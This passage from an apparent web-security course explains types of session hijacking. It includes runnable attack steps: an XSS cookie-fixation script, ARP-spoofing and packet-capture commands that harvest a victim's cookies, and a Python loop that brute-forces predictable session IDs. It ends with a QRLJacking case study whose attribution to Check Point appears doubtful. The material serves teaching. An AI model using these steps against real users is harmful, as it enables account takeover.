      <h2 class="section__title">Types of Session Hijacking Attacks</h2>
    </div>

    <div class="info-box info-box--exploit">
      <div class="info-box__title">🔴 1. Session Fixation</div>
      <div class="info-box__content">
        <p>The attacker sets (fixes) a victim's session ID <strong>before</strong> the victim logs in. After the victim authenticates with that fixed session ID, the attacker can use it to access the victim's account.</p>
        <div class="code-block">
          <div class="code-block__header">
            <span class="code-block__lang">HTTP — Session Fixation Attack</span>
            <button class="code-block__copy">Copy</button>
          </div>
          <pre><code># Step 1: Attacker obtains a valid session ID from the target site
GET /login HTTP/1.1
→ Set-Cookie: SESSIONID=attacker_controlled_id_xyz

# Step 2: Attacker crafts a URL that sets the session for the victim
# Via URL parameter (if the app accepts it):
https://bank.com/login?SESSIONID=attacker_controlled_id_xyz

# Or via XSS injection:
&lt;script&gt;document.cookie="SESSIONID=attacker_controlled_id_xyz"&lt;/script&gt;

# Step 3: Attacker sends the crafted link to the victim
# "Hey, check out this new feature on the bank website!"

# Step 4: Victim clicks link and logs in
POST /login HTTP/1.1
Cookie: SESSIONID=attacker_controlled_id_xyz
username=victim&password=their_secret_password
→ Server authenticates and associates the session with the victim

# Step 5: Attacker uses the SAME session ID
GET /account/balance HTTP/1.1
Cookie: SESSIONID=attacker_controlled_id_xyz
→ 200 OK: Balance: $50,000
# 💀 Attacker is now authenticated as the victim!</code></pre>
        </div>
      </div>
    </div>

    <div class="info-box info-box--exploit">
      <div class="info-box__title">🔴 2. Session Sidejacking</div>
      <div class="info-box__content">
        <p>Attacker sniffs session cookies from network traffic, typically on unencrypted WiFi networks. This is what Firesheep exploited. Also called <strong>cookie sidejacking</strong>.</p>
        <div class="code-block">
          <div class="code-block__header">
            <span class="code-block__lang">Bash — Session Sidejacking</span>
            <button class="code-block__copy">Copy</button>
          </div>
          <pre><code># On a public WiFi (coffee shop, airport):

# Step 1: Start ARP spoofing to intercept traffic
sudo arpspoof -i wlan0 -t 192.168.1.50 192.168.1.1
# Victim's IP: 192.168.1.50, Gateway: 192.168.1.1

# Step 2: Capture HTTP traffic with session cookies
sudo tcpdump -i wlan0 -w capture.pcap 'tcp port 80'

# Step 3: Extract cookies from capture
tshark -r capture.pcap -Y "http.cookie" -T fields -e http.cookie
→ SESSIONID=victim_session_abc123

# Step 4: Import cookie into attacker's browser
# Using browser dev tools or cookie editor extension
# → Set SESSIONID=victim_session_abc123
# → Refresh → Now logged in as victim! 💀</code></pre>
        </div>
      </div>
    </div>

    <div class="info-box info-box--exploit">
      <div class="info-box__title">🔴 3. Session Prediction</div>
      <div class="info-box__content">
        <p>If session IDs are generated using weak/predictable algorithms (sequential numbers, timestamp-based, weak PRNGs), an attacker can predict valid session IDs.</p>
        <div class="code-block">
          <div class="code-block__header">
            <span class="code-block__lang">Python — Session Prediction</span>
            <button class="code-block__copy">Copy</button>
          </div>
          <pre><code># ❌ VULNERABLE: Predictable session IDs
# Observed pattern:
# Session 1: sess_1001
# Session 2: sess_1002
# Session 3: sess_1003
# → Clearly sequential!

import requests

# Brute force valid sessions
for i in range(1000, 2000):
    session_id = f"sess_{i}"
    response = requests.get("https://target.com/dashboard",
                          cookies={"SESSIONID": session_id})
    if response.status_code == 200 and "Welcome" in response.text:
        print(f"✅ Valid session found: {session_id}")
        # → Hijacked someone's session! 💀</code></pre>
        </div>
      </div>
    </div>

    <div class="info-box info-box--exploit">
      <div class="info-box__title">🔴 4. Cross-Site Scripting (XSS) Session Theft</div>
      <div class="info-box__content">
        <p>Same as cookie stealing — inject JavaScript to extract session cookies and send to attacker's server. Already covered in the Cookie Stealing module.</p>
      </div>
    </div>

    <div class="info-box info-box--exploit">
      <div class="info-box__title">🔴 5. Man-in-the-Browser (MITB)</div>
      <div class="info-box__content">
        <p>Malware (Trojan) installed in the victim's browser intercepts and modifies web transactions in real-time. Unlike MITM, this happens inside the browser itself, bypassing HTTPS.</p>
        <p><strong>Examples:</strong> Zeus Trojan, SpyEye — intercepted banking sessions to modify transfer amounts and recipients in real-time.</p>
      </div>
    </div>
  </div>

  <!-- Real Case Study -->
  <div class="section">
    <div class="section__header">
      <div class="section__number">Section 4.3</div>
      <h2 class="section__title">Real Case Study: WhatsApp Web Session Hijacking</h2>
    </div>

    <div class="info-box info-box--example">
      <div class="info-box__title">🟣 WhatsApp Web QR Code Hijacking</div>
      <div class="info-box__content">
        <p><strong>Vulnerability (2015-2019):</strong> Researchers from Check Point discovered a vulnerability called "QRLJacking" that affected WhatsApp Web and other services using QR code authentication.</p>
        <p><strong>How it worked:</strong></p>
        <ul>
          <li>WhatsApp Web uses a QR code to authenticate — when scanned, a session token is transmitted</li>
          <li>Attacker creates a fake WhatsApp Web page with their own QR code</li>
          <li>The QR code actually contains the attacker's session request to the real WhatsApp servers</li>
          <li>When the victim scans the attacker's QR code, thinking it's WhatsApp, the attacker's browser gets authenticated</li>
          <li>Attacker now has full access to victim's WhatsApp messages in real-time</li>
        </ul>
        <p><strong>Impact:</strong> Complete access to all victim's conversations, contacts, and media. The attacker session persisted even after the victim closed their browser.</p>
        <p><strong>Fix:</strong> WhatsApp added session invalidation when another browser is detected and notification to the phone app when Web session is active.</p>
      </div>
    </div>
  </div>

